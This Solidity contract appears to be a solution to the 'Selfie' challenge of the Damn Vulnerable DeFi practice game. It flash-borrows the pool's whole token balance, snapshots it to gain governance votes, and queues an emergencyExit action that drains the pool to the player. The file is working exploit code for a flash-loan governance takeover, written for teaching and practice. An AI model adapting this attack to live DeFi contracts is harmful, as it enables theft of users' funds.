// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {SelfiePool, IERC3156FlashBorrower} from "../selfie/SelfiePool.sol";
import {SimpleGovernance} from "../selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";

contract HackSelfie is IERC3156FlashBorrower {
    address _player;
    SelfiePool _pool;
    SimpleGovernance _governance;
    address _token;

    constructor(SelfiePool pool_, SimpleGovernance governance_, address token_) {
        _player = msg.sender;
        _pool = pool_;
        _governance = governance_;
        _token = token_;
    }

    function queueProposal() external {
        uint256 amount = DamnValuableTokenSnapshot(_token).balanceOf(address(_pool));
        assert(amount == 1_500_000e18);
        _pool.flashLoan(IERC3156FlashBorrower(address(this)), _token, amount, "");
    }

    function executeProposal() external {
        _governance.executeAction(1);
    }

    function onFlashLoan(address operator, address token, uint256 amount, uint256, bytes calldata)
        external
        returns (bytes32)
    {
        require(_player == tx.origin);
        require(operator == address(this));
        require(token == _token);
        require(address(_pool) == msg.sender);

        DamnValuableTokenSnapshot(_token).snapshot();

        uint256 tokens = DamnValuableTokenSnapshot(_token).getBalanceAtLastSnapshot(address(this));
        assert(tokens == 1_500_000e18);

        uint128 value = 0;
        bytes memory data = abi.encodeWithSelector(SelfiePool.emergencyExit.selector, _player);
        _governance.queueAction(address(_pool), value, data);

        DamnValuableTokenSnapshot(_token).approve(address(_pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
